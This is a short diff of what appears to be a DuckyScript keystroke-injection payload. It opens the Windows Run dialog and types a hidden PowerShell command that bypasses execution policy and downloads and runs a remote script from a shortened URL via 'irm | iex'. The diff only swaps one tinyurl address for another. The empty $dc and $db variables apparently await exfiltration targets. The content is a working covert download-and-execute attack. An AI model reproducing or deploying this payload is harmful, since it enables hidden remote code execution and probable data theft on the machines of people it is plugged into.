@@ -12,6 +12,6 @@ GUI r
 
 DELAY 500
 
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://tinyurl.com/yckyb83b | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://tinyurl.com/yc4wv3y5 | iex
 
 ENTER
